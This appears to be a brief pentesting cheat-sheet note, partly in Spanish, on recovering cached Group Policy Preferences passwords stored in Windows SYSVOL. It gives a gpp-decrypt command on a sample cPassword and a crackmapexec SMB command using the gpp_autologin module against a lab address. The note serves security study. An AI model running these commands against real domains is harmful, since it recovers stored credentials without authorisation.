---
title: Cached GPP Password
---

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cached-gpp-pasword

Windows en SYSVOL guarda credenciales para comunicarse con equipos antiguos. Con la herramienta gpp-decrypt se puede pasar a texto claro.

##### To decrypt the cPassword:
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

##### Using crackmapexec to get the passwords:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
